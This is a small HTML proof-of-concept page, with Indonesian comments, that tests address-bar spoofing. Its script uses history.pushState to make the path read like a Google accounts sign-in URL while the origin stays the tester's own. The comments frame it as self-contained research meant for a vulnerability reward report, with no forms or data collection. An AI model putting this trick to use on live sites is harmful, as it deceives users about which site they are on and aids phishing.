<!-- 13 - pushState path tepercaya   [address-bar spoofing | macOS: semua macOS]
     MEKANISME : origin tetap milik penyerang; yang dipalsukan hanya PATH sehingga bilah terbaca seperti halaman akun.
     PREDIKAT  : bilah terbaca ".../accounts.google.com/signin" padahal host tetap origin ini.
     AMAN      : host tetap menonjol dan tak tertelan path.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>13 pushState path tepercaya</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
o.textContent='REAL: '+location.origin;
function go(){history.pushState({},'','/accounts.google.com/signin/v2/identifier');o.textContent='REAL masih: '+location.origin+' (lihat bilah)';}
</script>
